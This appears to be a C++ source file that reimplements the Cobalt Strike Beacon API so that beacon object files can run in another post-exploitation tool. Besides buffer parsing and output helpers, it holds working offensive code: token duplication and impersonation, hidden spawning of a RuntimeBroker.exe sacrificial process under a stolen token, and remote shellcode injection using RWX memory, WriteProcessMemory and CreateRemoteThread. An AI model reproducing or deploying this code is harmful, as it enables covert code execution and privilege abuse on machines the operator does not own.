
#include <beacon_api.hpp>
#include <stdio.h>


/* Internal */

void
manip_beacon_output(
        _In_ char* str,
        _In_ const bool clear,
        _In_ const bool get,
        _Out_ std::string* out
    ) {

    static std::string buff;
    if(clear) {
        buff.clear();
    } else if(get) {
        if(out != nullptr) {
            *out = buff;
        }
    } else {
        buff += str;
    }
}

void
manip_token(
        _In_ const bool clear,
        _In_ HANDLE token,
        _Out_ HANDLE* out
    ) {

    static HANDLE curr_token = nullptr;

    if(clear) {
        if(curr_token != nullptr) {
            CloseHandle(curr_token);
            curr_token = nullptr;
        }
    } else if(token != nullptr){
        curr_token = token;
    } else if(out != nullptr){
        *out = curr_token;
    }
}


void
clear_beacon_output() {
    manip_beacon_output(nullptr, true, false, nullptr);
}

std::string
get_beacon_output() {
    std::string out;
    manip_beacon_output(nullptr, false, true, &out);
    return out;
}


HANDLE
get_curr_token() {
    HANDLE token = nullptr;
    manip_token(false, nullptr, &token);
    return token;
}

void
set_curr_token(HANDLE token) {
    if(!token || token == INVALID_HANDLE_VALUE) {
        return;
    }

    manip_token(false, token, nullptr);
}

void
clear_curr_token() {
    manip_token(true, nullptr, nullptr);
}


// Not my function - copy & pasted lol
uint32_t swap_endianess(uint32_t indata) {
    uint32_t testint = 0xaabbccdd;
    uint32_t outint = indata;
    if (((unsigned char*)&testint)[0] == 0xdd) {
        ((unsigned char*)&outint)[0] = ((unsigned char*)&indata)[3];
        ((unsigned char*)&outint)[1] = ((unsigned char*)&indata)[2];
        ((unsigned char*)&outint)[2] = ((unsigned char*)&indata)[1];
        ((unsigned char*)&outint)[3] = ((unsigned char*)&indata)[0];
    }
    return outint;
}

size_t
char_to_wide_impl(wchar_t* dest, char* src, size_t max_allowed) {

    int len = static_cast<int>(max_allowed);
    while(--len >= 0) {
        if (!( *dest++ = *src++))
            return max_allowed - len - 1;
    }

    return max_allowed - len;
}



/* used by BOFs */
// implementations are mostly borrowed with some exceptions.

void
BeaconDataParse(datap* parser, char* buffer, int size) {
    if (parser == nullptr) {
        return;
    }

    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size - 4;
    parser->size = size - 4;
    parser->buffer += 4;
}


int
BeaconDataInt(datap* parser) {
    int fourbyteint = 0;
    if (parser->length < 4) {
        return 0;
    }
    memcpy(&fourbyteint, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return fourbyteint;
}


short
BeaconDataShort(datap* parser) {
    short retvalue = 0;
    if (parser->length < 2) {
        return 0;
    }
    memcpy(&retvalue, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return retvalue;
}


int
BeaconDataLength(datap* parser) {
    return parser->length;
}


char*
BeaconDataExtract(datap* parser, int* size) {

    int   length  = 0;
    char* outdata = nullptr;

    if (parser->length < 4) {
        return nullptr;
    }

    memcpy(&length, parser->buffer, 4);
    parser->buffer += 4;

    outdata = parser->buffer;
    if (outdata == nullptr) {
        return nullptr;
    }

    parser->length -= 4;
    parser->length -= length;
    parser->buffer += length;
    if (size != nullptr && outdata != nullptr) {
        *size = length;
    }

    return outdata;
}


void
BeaconFormatAlloc(formatp* format, int maxsz) {

    if(format == nullptr) {
        return;
    }

    format->original = static_cast<char*>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxsz));
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
}


void
BeaconFormatReset(formatp *format) {

    memset(format->original, 0, format->size);
    format->buffer = format->original;
    format->length = format->size;
}


void
BeaconFormatAppend(formatp *format, char* text, int len) {

    memcpy( format->buffer, text, len );
    format->buffer += len;
    format->length += len;
}

void
BeaconOutput(int type, char* data, int len) {
    manip_beacon_output(data, false, false, nullptr);
}


void
BeaconFormatPrintf(formatp* format, char *fmt, ...) {

    va_list args   = { 0 };
    int     length = 0;

    va_start(args, fmt);
    length = vsnprintf(nullptr, 0, fmt, args);
    va_end( args );

    if (format->length + length > format->size) {
        return;
    }

    va_start(args, fmt);
    vsnprintf(format->buffer, length, fmt, args );
    va_end(args);

    format->length += length;
    format->buffer += length;
}


char*
BeaconFormatToString(formatp* format, int* size) {
    *size = format->length;
    return format->original;
}


void
BeaconFormatFree(formatp *format) {
    if (format == nullptr)
        return;

    if(format->original != nullptr) {
        HeapFree(GetProcessHeap(), 0, format->original);
        format->original = nullptr;
    }

    format->buffer = nullptr;
    format->length = 0;
    format->size   = 0;
}


void
BeaconFormatInt(formatp *format, int value) {

    uint32_t indata = value;
    uint32_t outdata = 0;
    if (format->length + 4 > format->size) { //if over max size
        return;
    }

    outdata = swap_endianess(indata);
    memcpy(format->buffer, &outdata, 4);

    format->length += 4;
    format->buffer += 4;
}


void
BeaconPrintf(int type, char* fmt, ...) {

    va_list VaList  = nullptr;
    char*   buff    = nullptr;

    va_start(VaList, fmt);
    int len = vsnprintf(nullptr, 0, fmt, VaList);
    if(!len) {
        va_end(VaList);
        return;
    }

    buff = static_cast<char*>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len + 1));
    if(!buff) {
        va_end(VaList);
        return;
    }

    vsnprintf(buff, len, fmt, VaList);
    manip_beacon_output(buff, false, false, nullptr);

    va_end(VaList);
    memset(buff, 0, len);
    HeapFree(GetProcessHeap(), 0, buff);
}


BOOL
BeaconIsAdmin() {

    HANDLE          htoken       = nullptr;
    TOKEN_ELEVATION elevation    = { 0 };
    uint32_t        bytes_needed = 0;

    if(!OpenProcessToken(
        GetCurrentProcess(),
        TOKEN_QUERY,
        &htoken
    )) {
        return FALSE;
    }

    if(!GetTokenInformation(
        htoken,
        TokenElevation,
        &elevation,
        sizeof(elevation),
        reinterpret_cast<PDWORD>(&bytes_needed)
    )) {
        CloseHandle(htoken);
        return FALSE;
    }

    CloseHandle(htoken);
    return (elevation.TokenIsElevated != 0 ? TRUE : FALSE);
}


//
// 1. Revert the current token to the original
// 2. Duplicate the provided token to a primary token with SecurityDelegation
// 3. Call ImpersonateLoggedOnUser to impersonate the new primary token
//

BOOL
BeaconUseToken(HANDLE token) {

    HANDLE hduplicate_token = nullptr;
    BeaconRevertToken();

    if(!DuplicateTokenEx(
        token,
        MAXIMUM_ALLOWED,
        nullptr,
        SecurityDelegation,
        TokenPrimary,
        &hduplicate_token
    )) {
        return FALSE;
    }

    if(!ImpersonateLoggedOnUser(hduplicate_token)) {
        return FALSE;
    }

    set_curr_token(hduplicate_token);
    return TRUE;
}

void
BeaconRevertToken() {
    clear_curr_token();
    RevertToSelf();
}



void
BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {

    wchar_t         ext[]                   = L"\\System32\\RuntimeBroker.exe";
    wchar_t         windows_dir[MAX_PATH]   = { 0 };
    wchar_t         final[MAX_PATH]         = { 0 };
    unsigned int    len                     = 0;
    unsigned int    size                    = 0;

    //-----------------------------------------------------------------//

    if(x86) { //not supported
        return;
    }

    len = GetWindowsDirectoryW(windows_dir, MAX_PATH);
    if(!len) {
        return;
    }

    //
    // note: "len" will contain the length in characters, NOT in bytes.
    //

    memcpy(final, windows_dir, len * sizeof(wchar_t));
    memcpy(&final[len], ext, sizeof(ext));

    size = wcslen(final) * sizeof(wchar_t);
    if(size > length) {
        return;
    }

    memcpy(buffer, final, size);
}


BOOL
BeaconSpawnTemporaryProcess(BOOL x86, BOOL ignoreToken, STARTUPINFO* si, PROCESS_INFORMATION* pInfo) {

    HANDLE  htoken               = nullptr;
    wchar_t path[MAX_PATH]       = { 0 };

    BeaconGetSpawnTo(FALSE, (char*)path, sizeof(path));
    htoken = get_curr_token();

    if(x86 || path[0] == L'\0' || (!ignoreToken && htoken == nullptr)) {
        return FALSE;
    }


    if(ignoreToken) {
        return CreateProcessW(
            nullptr,
            path,
            nullptr,
            nullptr,
            TRUE,
            CREATE_NO_WINDOW,
            nullptr,
            nullptr,
            (LPSTARTUPINFOW)si,
            pInfo
        );
    }

    return CreateProcessAsUserW(
        htoken,
        nullptr,
        path,
        nullptr,
        nullptr,
        TRUE,
        CREATE_NO_WINDOW,
        nullptr,
        nullptr,
        (LPSTARTUPINFOW)si,
        pInfo
    );
}


void
BeaconInjectTemporaryProcess(
        PROCESS_INFORMATION* pInfo,
        char* payload,
        int p_len,
        int p_offset,
        char* arg,
        int a_len
    ) {

    char*   remote_payload      = nullptr;
    char*   remote_args         = nullptr;
    HANDLE  hthread             = nullptr;
    size_t  bytes_written       = 0;

    if(payload == nullptr || !p_len) {
        return;
    }


    remote_payload = static_cast<char*>(VirtualAllocEx(
        pInfo->hProcess,
        nullptr,
        p_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    ));

    if(remote_payload == nullptr) {
        return;
    }

    if(!WriteProcessMemory(
        pInfo->hProcess,
        remote_payload,
        payload,
        p_len,
        &bytes_written
    ) || bytes_written != p_len) {
        return;
    }


    if(arg != nullptr && a_len) {

        remote_args = static_cast<char*>(VirtualAllocEx(
            pInfo->hProcess,
            nullptr,
            a_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        ));

        if(remote_args == nullptr) {
            return;
        }

        bytes_written = 0;
        if(!WriteProcessMemory(
            pInfo->hProcess,
            remote_args,
            arg,
            a_len,
            &bytes_written
        ) || bytes_written != a_len) {
            return;
        }
    }

    //
    // this is a random ass fork & run BOF function nobody should use anyways,
    // so frankly I don't give a flying fuck
    //
    hthread = CreateRemoteThread(
        pInfo->hProcess,
        nullptr,
        0,
        (LPTHREAD_START_ROUTINE)(remote_payload + p_offset),
        remote_args,
        0,
        nullptr
    );

    if(hthread != nullptr) {
        CloseHandle(hthread);
    }
}


void
BeaconInjectProcess(HANDLE hProc, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len) {

    if(hProc == nullptr) {
        hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if(hProc == nullptr) {
            return;
        }
    }

    PROCESS_INFORMATION proc_info = { 0 };
    proc_info.hProcess      = hProc;
    proc_info.dwProcessId   = pid;

    BeaconInjectTemporaryProcess(&proc_info, payload, p_len, p_offset, arg, a_len);
}


void
BeaconCleanupProcess(PROCESS_INFORMATION* pInfo) {
    if(pInfo->hProcess != nullptr) {
        CloseHandle(pInfo->hProcess);
    }
    if(pInfo->hThread != nullptr) {
        CloseHandle(pInfo->hThread);
    }
}


BOOL
toWideChar(char* src, wchar_t* dst, int max) {

    const size_t length = char_to_wide_impl(dst, src, max);
    if (length == 0) {
        return FALSE;
    }

    return TRUE;
}